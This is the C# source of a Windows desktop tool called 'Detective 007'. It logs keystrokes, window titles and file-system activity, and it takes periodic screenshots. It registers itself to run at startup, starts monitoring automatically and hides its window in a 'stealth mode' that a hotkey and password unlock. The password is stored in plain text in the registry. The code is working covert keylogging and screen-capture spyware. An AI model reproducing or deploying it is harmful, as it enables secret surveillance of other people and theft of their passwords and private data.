using System;
using System.Collections;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Text;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Reflection;
namespace Detective_007
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);
        [DllImport("user32.dll")]
        static extern int GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(int hWnd, StringBuilder text, int count);

        Timer WindowTimer = new Timer();
        Timer ScreenCapture = new Timer();
        FileSystemWatcher[] fsw = new FileSystemWatcher[Environment.GetLogicalDrives().Length];

        int readyDrives = 0;
        RegistryKey rk;

        public Form1()
        {
            InitializeComponent();
            InitializeFromRegistry();
            InitializePass();
            WindowTimer.Enabled = true;
            WindowTimer.Interval = 100;
            WindowTimer.Stop();
            WindowTimer.Tick += new EventHandler(t_Tick);

            ScreenCapture.Enabled = true;
            ScreenCapture.Interval = 60 * 1000;
            ScreenCapture.Stop();
            ScreenCapture.Tick += new EventHandler(ScreenCapture_Tick);



            foreach (string path in Environment.GetLogicalDrives())
            {
                if (new DriveInfo(path).IsReady)
                {
                    fsw[readyDrives] = new FileSystemWatcher();
                    fsw[readyDrives].Path = path;
                    fsw[readyDrives].IncludeSubdirectories = true;
                    fsw[readyDrives].NotifyFilter = NotifyFilters.LastAccess | NotifyFilters.LastWrite
                    | NotifyFilters.FileName | NotifyFilters.DirectoryName;
                    // Add event handlers.
                    fsw[readyDrives].Changed += new FileSystemEventHandler(OnChanged);
                    fsw[readyDrives].Created += new FileSystemEventHandler(OnChanged);
                    fsw[readyDrives].Deleted += new FileSystemEventHandler(OnChanged);
                    fsw[readyDrives++].Renamed += new RenamedEventHandler(OnRenamed);
                }
            }


            tbScreenSavePath.Text = (Environment.CurrentDirectory + @"\Screen Captures\");
        }
        private void InitializePass()
        {
            rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\");
            try
            {
                rk = rk.OpenSubKey("Detective 007");

                if (rk.GetValue("") != null)
                {
                    cbPasswordProtection.CheckedChanged -= cbPasswordProtection_CheckedChanged;
                    cbPasswordProtection.Checked =
                    bChangePassword.Enabled = true;
                    gp.password = (string)rk.GetValue("");
                    cbPasswordProtection.CheckedChanged += cbPasswordProtection_CheckedChanged;
                }
            }
            catch { }
        }
        private bool IsStartUpSelected;
        private void InitializeFromRegistry()
        {
            RegistryKey rk;
            rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\");
            cbStartWithWindows.CheckedChanged -= cbStartWithWindows_CheckedChanged;
            cbStartWithWindows.Checked = true;
            cbStartWithWindows.CheckedChanged += cbStartWithWindows_CheckedChanged;
            if (rk.GetValue("Dectecive 007") != null)
            {
                rCurrentUser.Checked = true;
                rk.Close();
                IsStartUpSelected = true;
                return;
            }
            rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\");
            if (rk.GetValue("Dectecive 007") != null)
            {
                rAllUsers.Checked = true;
                rk.Close();
                IsStartUpSelected = true;
                return;
            }
            cbStartWithWindows.Checked = false;
        }


        private void OnChanged(object source, FileSystemEventArgs e)
        {
            switch (e.ChangeType)
            {
                case WatcherChangeTypes.Changed:
                    if (cbFileChanged.Checked) goto last;
                    break;
                case WatcherChangeTypes.Created:
                    if (cbFileCreated.Checked) goto last;
                    break;
                case WatcherChangeTypes.Deleted:
                    if (cbFileDeleted.Checked) goto last;
                    break;
                last:
                    lvResulttb3.Items.Add(new ListViewItem(new string[] { Path.GetFileName(e.FullPath), e.ChangeType + "", DateTime.Now.ToLongTimeString() + "  " + DateTime.Now.ToLongDateString(), e.FullPath }));
                    lvResulttb3.EnsureVisible(lvResulttb3.Items.Count - 1);
                    break;
            }
            if (lvResulttb3.Items.Count != 0 && !bFileOperationSave.Enabled)
                bFileOperationSave.Enabled = true;

        }

        private void OnRenamed(object source, RenamedEventArgs e)
        {
            if (cbFileRenamed.Checked) lvResulttb3.Items.Add(new ListViewItem(new string[] { Path.GetFileName(e.OldFullPath) + " --> " + Path.GetFileName(e.FullPath), e.ChangeType + "", DateTime.Now.ToLongTimeString() + "  " + DateTime.Now.ToLongDateString(), e.OldFullPath + " --> " + e.FullPath }));
        }

        void ScreenCapture_Tick(object sender, EventArgs e)
        {
            String timestamp = DateTime.Now.ToString("yyyy MMM dd hh-mm-ss tt");
            using (Bitmap screen = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                       Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(screen))
                {
                    g.CopyFromScreen(0, 0, 0, 0, screen.Size);
                }
                screen.Save(tbScreenSavePath.Text + timestamp + ".bmp");
            }
            lvScreenCapture.Items.Add(new ListViewItem(new string[] { timestamp + ".bmp", timestamp }));
            lvScreenCapture.EnsureVisible(lvScreenCapture.Items.Count - 1);
        }

        void t_Tick(object sender, EventArgs e)
        {
            GetWindowTitle();
        }
        private void GetWindowTitle()
        {
            const int nChars = 256;
            int handle = 0;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0 && Buff.ToString() != "Detective 007 - By Vineel Kumar Reddy.")
            {
                if ((lvWindowTitles.Items.Count > 0 && Buff.ToString() != lvWindowTitles.Items[lvWindowTitles.Items.Count - 1].Text) || lvWindowTitles.Items.Count == 0)
                {
                    ListViewItem temp = new ListViewItem(new String[] { Buff.ToString(), DateTime.Now.ToLongTimeString() + " " + DateTime.Now.ToLongDateString() });
                    lvWindowTitles.Items.Add(temp);
                    lvWindowTitles.EnsureVisible(lvWindowTitles.Items.Count - 1);
                }
            }
        }

        private void cbStartStop_CheckedChanged(object sender, EventArgs e)
        {
            if (cbStartStop.Text == "Start Monitoring")
            {

                if (!Directory.Exists(tbScreenSavePath.Text)) Directory.CreateDirectory(tbScreenSavePath.Text);
                button1.Enabled = true;         //"Run in Stealth Mode" Button.............
                cbStartStop.Text = "Stop Monitoring";
                if (cbWindowTitles.Checked) WindowTimer.Start();

                if (cbScreenCaptures.Checked) ScreenCapture.Start();

                if (cbKeyLogger.Checked)
                    KeyboardListener.s_KeyEventHandler += new EventHandler(KeyboardListener_s_KeyEventHandler);

                if (cbFileMonitor.Checked)
                    for (int i = 0; i < readyDrives; i++)
                        fsw[i].EnableRaisingEvents = true;

                gbMonitoring.Enabled = false;
            }
            else
            {
                button1.Enabled = false;
                cbStartStop.Text = "Start Monitoring";
                if (cbWindowTitles.Checked) WindowTimer.Stop();
                if (cbScreenCaptures.Checked) ScreenCapture.Stop();
                if (cbKeyLogger.Checked)
                    KeyboardListener.s_KeyEventHandler -= KeyboardListener_s_KeyEventHandler;
                if (cbFileMonitor.Checked)
                    for (int i = 0; i < readyDrives; i++)
                        fsw[i].EnableRaisingEvents = false;
                gbMonitoring.Enabled = true;
            }
        }

        private void lvWindowTitles_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            bDeleteWindowTitles.Enabled =
                lvWindowTitles.SelectedItems.Count != 0 ? true : false;
        }

        private void lvWindowTitles_ItemActivate(object sender, EventArgs e)
        {
            try
            {
                Process.Start(lvWindowTitles.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("This is not a directory...!", "Detective 007");
            }
        }

        private void bDeleteWindowTitles_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in lvWindowTitles.SelectedItems)
                l.Remove();
        }

        private void bDeleteScreenCapture_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (ListViewItem lvi in lvScreenCapture.SelectedItems)
                {
                    File.Delete(tbScreenSavePath.Text + lvi.Text);
                    lvi.Remove();
                }
            }
            catch (Exception e1)
            {
                MessageBox.Show(e1.Message, "Detective 007");
            }
        }

        private void lvScreenCapture_ItemActivate(object sender, EventArgs e)
        {
            try
            {
                Process.Start(tbScreenSavePath.Text + lvScreenCapture.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("This is not a directory...!", "Detective 007");
            }
        }

        private void nupScreenCaptureTimeInterval_ValueChanged(object sender, EventArgs e)
        {
            if (nupScreenCaptureTimeInterval.Value > 0)
                ScreenCapture.Interval = (int)(nupScreenCaptureTimeInterval.Value * 60 * 1000);
            ScreenCapture.Stop();
            ScreenCapture.Start();
        }
        private void bScreenCaptureBrowse_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fbd = new FolderBrowserDialog();
            fbd.Description = "Specify the path to save captured screenshots....";
            if (fbd.ShowDialog() == DialogResult.OK)
            {
                tbScreenSavePath.Text = fbd.SelectedPath + "\\";
            }
        }

        private void lvScreenCapture_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            bPlayScreenCapture.Enabled =
            BClearScreen.Enabled =
            bDeleteScreenCapture.Enabled =
            lvScreenCapture.SelectedItems.Count != 0 ? true : false;
        }

        private void cbStartWithWindows_CheckedChanged(object sender, EventArgs e)
        {
            if (cbStartWithWindows.Checked)
            {
                rCurrentUser.Enabled = rAllUsers.Enabled = true;
                rCurrentUser.Checked = true;
                rAllUsers.Checked = false;
            }
            else
            {
                rCurrentUser.Enabled = rAllUsers.Enabled = false;
                rCurrentUser.Checked = false;
                rAllUsers.Checked = false;
            }

        }

        private void rCurrentUser_CheckedChanged(object sender, EventArgs e)
        {
            RegistryKey rk1;
            rk1 = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
            if (rCurrentUser.Checked)
                rk1.SetValue("Dectecive 007", Environment.CurrentDirectory + @"\Detective_007.exe");

            else
                rk1.DeleteValue("Dectecive 007", false);
            rk1.Close();
        }

        private void rAllUsers_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                RegistryKey rk1;
                rk1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                if (rAllUsers.Checked)
                    rk1.SetValue("Dectecive 007", Environment.CurrentDirectory + @"\Detective_007.exe");
                else
                    rk1.DeleteValue("Dectecive 007", false);
                rk1.Close();
            }
            catch
            {
                MessageBox.Show("You Have no Sufficient rights to edit Run Key of the Registry...!", "Detective 007");
            }
        }
        #region Hotkey initialization
        [DllImport("user32.dll")]
        public static extern int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk);
        [DllImport("user32.dll")]
        static extern bool UnregisterHotKey(IntPtr hWnd, int id);
        private const int MOD_ALT = 0x1;
        private const int MOD_CONTROL = 0x2;
        private const int MOD_WIN = 0x8;
        private const int WM_HOTKEY = 0x312;
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_HOTKEY)
            {
                if (!Visible)
                {
                    if (cbPasswordProtection.Checked)
                    {
                        gp.ShowPasswordDialog(false, false);
                        gp.ShowDialog();
                        if (gp.result == DialogResult.OK)
                        {
                            this.Visible = true;
                            UnregisterHotKey(this.Handle, 1);
                        }
                    }
                    else
                    {
                        this.Visible = true;
                        UnregisterHotKey(this.Handle, 1);
                    }
                }
            }
        }

        #endregion
        bool ShiftKeyPressed = false;
        bool CapsKeyPressed = false;
        private void KeyboardListener_s_KeyEventHandler(object sender, EventArgs e)
        {

            int WM_KEYDOWN = 0x0100,
                WM_KEYUP = 0x0101,
                VK_SHIFT = 0x10,
                VK_CAPITAL = 0x14;
            String VKeyPressed;
            KeyboardListener.UniversalKeyEventArgs eventArgs = (KeyboardListener.UniversalKeyEventArgs)e;
            
             if (eventArgs.m_Msg == WM_KEYUP) {
                 if (eventArgs.m_Key == VK_SHIFT) { 
                    ShiftKeyPressed = false;
                    return;
                 }
             } else if (eventArgs.m_Msg == WM_KEYDOWN) {
                 if (eventArgs.m_Key == VK_SHIFT) { 
                    ShiftKeyPressed = true;
                    return;
                 }
                 if (eventArgs.m_Key == VK_CAPITAL)
                 {
                     CapsKeyPressed = !CapsKeyPressed;
                     return;
                 }

                switch (eventArgs.m_Key)
                {
                    case 0x30:
                        VKeyPressed = ShiftKeyPressed ? ")" : "0";
                        break;
                    case 0x31:
                        VKeyPressed = ShiftKeyPressed ? "!" : "1";
                        break;
                    case 0x32:
                        VKeyPressed = ShiftKeyPressed ? "@" : "2";
                        break;
                    case 0x33:
                        VKeyPressed = ShiftKeyPressed ? "#" : "3";
                        break;
                    case 0x34:
                        VKeyPressed = ShiftKeyPressed ? "$" : "4";
                        break;
                    case 0x35:
                        VKeyPressed = ShiftKeyPressed ? "%" : "5";
                        break;
                    case 0x36:
                        VKeyPressed = ShiftKeyPressed ? "^" : "6";
                        break;
                    case 0x37:
                        VKeyPressed = ShiftKeyPressed ? "&" : "7";
                        break;
                    case 0x38:
                        VKeyPressed = ShiftKeyPressed ? "*" : "8";
                        break;
                    case 0x39:
                        VKeyPressed = ShiftKeyPressed ? "(" : "9";
                        break;
                    case 0xC0:
                        VKeyPressed = ShiftKeyPressed ? "~" : "`";
                        break;
                    case 0xBA:
                        VKeyPressed = ShiftKeyPressed ? ":" : ";";
                        break;
                    case 0xBB:
                        VKeyPressed = ShiftKeyPressed ? "+" : "=";
                        break;
                    case 0xBC:
                        VKeyPressed = ShiftKeyPressed ? "<" : ",";
                        break;
                    case 0xBD:
                        VKeyPressed = ShiftKeyPressed ? "_" : "-";
                        break;
                    case 0xBE:
                        VKeyPressed = ShiftKeyPressed ? ">" : ".";
                        break;
                    case 0xBF:
                        VKeyPressed = ShiftKeyPressed ? "?" : "/";
                        break;
                    case 0xDB:
                        VKeyPressed = ShiftKeyPressed ? "{" : "[";
                        break;
                    case 0xDC:
                        VKeyPressed = ShiftKeyPressed ? "|" : "\\";
                        break;
                    case 0xDD:
                        VKeyPressed = ShiftKeyPressed ? "}" : "]";
                        break;
                    case 0xDE:
                        VKeyPressed = ShiftKeyPressed ? "\"" : "'";
                        break;
                    default:
                        VKeyPressed = ShiftKeyPressed || CapsKeyPressed ? eventArgs.KeyData.ToString().ToUpper() : eventArgs.KeyData.ToString().ToLower();
                        break;
                }
                

                tbKeyData.Text += VKeyPressed;
            }
                
           
        }
        private void bClearData_Click(object sender, EventArgs e)
        {
            this.tbKeyData.Text = "";
        }
        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("To get back to normal mode press Win+G", "Detective 007");
            RegisterHotKey(this.Handle, 1, MOD_WIN, (int)Keys.G);
            this.Visible = false;
        }

        private void bPlayScreenCapture_Click(object sender, EventArgs e)
        {
            PlayPictures p = new PlayPictures();
            p.ShowScreenCaptures(tbScreenSavePath.Text);
            p.ShowDialog();
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (lvWindowTitles.CanFocus)
            {
                if ((e.KeyCode == Keys.A && e.Control) && (lvWindowTitles.Items.Count != 0))
                {
                    foreach (ListViewItem i in lvWindowTitles.Items)
                        i.Selected = true;
                    lvWindowTitles.Select();

                }
                if (e.KeyCode == Keys.Delete)
                {
                    foreach (ListViewItem l in lvWindowTitles.SelectedItems)
                        l.Remove();
                }
            }
            if (lvScreenCapture.CanFocus)
            {
                if ((e.KeyCode == Keys.A && e.Control) && (lvScreenCapture.Items.Count != 0))
                {

                    foreach (ListViewItem i in lvScreenCapture.Items)
                        i.Selected = true;
                    lvScreenCapture.Select();

                }
                if (e.KeyCode == Keys.Delete)
                {
                    try
                    {
                        foreach (ListViewItem l in lvScreenCapture.SelectedItems)
                        {
                            File.Delete(tbScreenSavePath.Text + l.Text);
                            l.Remove();
                        }
                    }
                    catch (Exception e1)
                    {
                        MessageBox.Show(e1.Message, "Detective 007");
                    }
                }
            }
            if (lvResulttb3.CanFocus)
            {
                if ((e.KeyCode == Keys.A && e.Control) && (lvResulttb3.Items.Count != 0))
                {
                    foreach (ListViewItem i in lvResulttb3.Items)
                        i.Selected = true;
                    lvResulttb3.Select();

                }
                if (e.KeyCode == Keys.Delete)
                {
                    foreach (ListViewItem l in lvResulttb3.SelectedItems)
                        l.Remove();
                }
            }
        }


        GetPassword gp = new GetPassword();
        private void cbPasswordProtection_CheckedChanged(object sender, EventArgs e)
        {
            rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\", true);
            rk.CreateSubKey("Detective 007");
            rk = rk.OpenSubKey("Detective 007", true);
            try
            {
                if (cbPasswordProtection.Checked)
                {
                    bChangePassword.Enabled = !string.IsNullOrEmpty(gp.password);
                    gp.ShowPasswordDialog(true, false);
                    gp.ShowDialog();
                    if (gp.result == DialogResult.OK)
                    {
                        bChangePassword.Enabled = true;
                        if (!string.IsNullOrEmpty(gp.password))
                        {
                            rk.SetValue("", gp.password);
                        }
                    }
                    else cbPasswordProtection.Checked = false;
                }
                else
                {
                    bChangePassword.Enabled = false;
                    gp.password = null;
                    rk.DeleteValue("");
                    MessageBox.Show("Password successfully removed", "Detective 007");
                }
            }
            catch { }
        }

        private void bChangePassword_Click(object sender, EventArgs e)
        {
            gp.ShowPasswordDialog(false, true);
            gp.ShowDialog();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (IsStartUpSelected)
            {
                cbFileMonitor.Checked = false;
                cbStartStop.Checked = true;
                rCurrentUser.Enabled = rAllUsers.Enabled = true;
                button1.PerformClick();
            }
        }

        private void bCleartb3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in lvResulttb3.SelectedItems)
                l.Remove();
        }

        private void lvResulttb3_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            bCleartb3.Enabled =
                  lvResulttb3.SelectedItems.Count != 0 ? true : false;
        }

        private void bFileOperationSave_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.AddExtension = true;
            sfd.CheckPathExists = true;
            sfd.Filter = "File Operations Log(*.log)|*.log";
            sfd.FileName = "Log [" + DateTime.Now.ToShortTimeString().Replace(':', '-') + "].log";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                FileStream fs = new FileStream(sfd.FileName, FileMode.Create);
                StreamWriter sw = new StreamWriter(fs);
                ListView.ListViewItemCollection lvic = lvResulttb3.Items;
                sw.WriteLine("{0,-20}   {1}   {2,-30}   {3}", "File Name", "File Operations", "Time", "File Path");
                sw.WriteLine("===================================================================================");
                foreach (ListViewItem l in lvic)
                    sw.WriteLine("{0,-20}   {1}   {2}   {3}", l.SubItems[0].Text, l.SubItems[1].Text, l.SubItems[2].Text, l.SubItems[3].Text);
                sw.WriteLine("===================================================================================");
                sw.Close();
                fs.Close();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (cbPasswordProtection.Checked && !string.IsNullOrEmpty(gp.password))
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Detective 007", true);
                rk.SetValue("", gp.password);
                //   MessageBox.Show(rk.Name + "updated" + gp.password);
            }
            if (cbStartStop.Checked) cbStartStop.Checked = false;


            //if (e.CloseReason == CloseReason.ApplicationExitCall)
            //{
            //    e.Cancel = false;
            //    MessageBox.Show("Donot do that....:)");
            //}

        }

        private void Form1_Paint(object sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;
            //bottom rectangle
            {
                int width = this.Width - 12, height = 35;
                int x = 2, y = 320;

                Pen p = new Pen(Color.FromArgb(224, 224, 224), 1);
                g.DrawRectangle(p, new Rectangle(x - 1, y - 1, width + 2, height + 2));
                p.Dispose();

                SolidBrush sb = new SolidBrush(Color.FromArgb(248, 248, 248));
                g.FillRectangle(sb, new Rectangle(x, y, width, height));
                sb.Dispose();
            }
            {
                int width = this.Width - 18, height = 55;
                int x = 5, y = 4;

                Pen p = new Pen(Color.FromArgb(222, 199, 65), 1);
                Helper.DrawRoundRect(g, p, x - 2, y - 2, width + 4, height + 4, 10);
                p.Dispose();

                SolidBrush sb = new SolidBrush(Color.FromArgb(255, 251, 236));
                Helper.FillRoundRect(g, sb, x - 1, y - 1, width, height + 2, 10);
                sb.Dispose();
            }
        }
        //Here i used Detective_007.Properties.Resources.* to get the resources
        private void tabControl1_Selected(object sender, TabControlEventArgs e)
        {
            switch (e.TabPageIndex)
            {
                case 0:
                    pbInfoPic.Image = Detective_007.Properties.Resources.image1;
                    lInfo.Text = "Logs window titles";
                    break;
                case 1:
                    pbInfoPic.Image = Detective_007.Properties.Resources.image2;
                    lInfo.Text = "Logs key strokes of the user";
                    break;
                case 2:
                    pbInfoPic.Image = Detective_007.Properties.Resources.image3;
                    lInfo.Text = "Captures screenshots at regular intervals";
                    break;
                case 3:
                    pbInfoPic.Image = Detective_007.Properties.Resources.image4;
                    lInfo.Text = "Log file system activity";
                    break;
                case 4:
                    pbInfoPic.Image = Detective_007.Properties.Resources.image5;
                    lInfo.Text = "Change Detective 007 Settings";
                    break;
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("http://www.vineelkumarreddy.com");
        }

        #region moving a form when dragged in client area
        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HTCAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }
        #endregion
    }
}